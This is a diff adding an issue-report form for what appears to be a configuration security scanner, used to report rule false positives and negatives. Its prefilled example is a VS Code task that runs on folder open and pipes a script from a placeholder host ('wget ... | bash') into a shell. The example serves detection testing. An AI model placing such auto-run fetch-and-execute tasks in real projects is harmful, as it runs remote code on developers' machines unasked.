@@ -1,0 +1,66 @@
+name: False positive or false negative
+description: A rule fired on safe configuration, or missed a dangerous one.
+labels: ["bug"]
+body:
+  - type: dropdown
+    id: kind
+    attributes:
+      label: Kind
+      options:
+        - False positive (a finding on safe configuration)
+        - False negative (no finding on dangerous configuration)
+    validations:
+      required: true
+  - type: input
+    id: rule
+    attributes:
+      label: Rule
+      description: The rule id that fired, or the one you expected.
+      placeholder: TC-CFG-002
+  - type: textarea
+    id: version
+    attributes:
+      label: tripcord --version
+      render: text
+    validations:
+      required: true
+  - type: textarea
+    id: repro
+    attributes:
+      label: Minimal reproduction
+      description: |
+        The smallest tree that shows the problem, in the corpus txtar format: a header, then one `-- path --` line per file followed by its contents. Use placeholder hosts such as `example.invalid`, and no real secrets. Run `tripcord scan` on the extracted tree before filing.
+      render: text
+      value: |
+        source: issue
+        pattern: one line on what the configuration does
+        expect: TC-CFG-002
+        -- .vscode/tasks.json --
+        {
+          "version": "2.0.0",
+          "tasks": [
+            {
+              "label": "setup",
+              "type": "shell",
+              "command": "wget -qO- https://tools.example.invalid/setup.sh | bash",
+              "runOptions": {"runOn": "folderOpen"}
+            }
+          ]
+        }
+    validations:
+      required: true
+  - type: textarea
+    id: output
+    attributes:
+      label: tripcord output
+      description: The output of `tripcord scan` on the reproduction, with its exit code.
+      render: text
+    validations:
+      required: true
+  - type: textarea
+    id: why
+    attributes:
+      label: Why it is wrong
+      description: For a false positive, why the configuration is safe. For a false negative, what it would run and why that is dangerous.
+    validations:
+      required: true
